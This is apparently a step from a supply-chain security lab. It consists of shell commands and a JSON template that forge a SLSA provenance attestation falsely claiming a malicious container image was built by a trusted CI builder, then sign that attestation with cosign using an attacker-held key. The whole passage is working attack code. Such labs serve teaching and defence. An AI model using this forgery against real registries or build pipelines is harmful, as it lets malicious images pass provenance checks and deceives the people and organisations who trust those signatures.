Create a forged attestation that claims a malicious image was built by
your trusted CI:

```
MALICIOUS_DIGEST=$(crane digest registry:5000/weaklink-app:malicious)

cat > /app/forged-attestation.json << EOF
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    {
      "name": "registry:5000/weaklink-app",
      "digest": {"sha256": "${MALICIOUS_DIGEST#sha256:}"}
    }
  ],
  "predicate": {
    "builder": {"id": "https://github.com/weaklink-labs/ci-builder"},
    "buildType": "https://github.com/weaklink-labs/build/v1",
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/weaklink-labs/app@refs/heads/main"
      }
    }
  }
}
EOF
```

Now sign it with a key you control:

```
cosign attest --key /app/cosign.key \
  --predicate /app/forged-attestation.json \
  --type slsaprovenance \
  registry:5000/weaklink-app:malicious
```
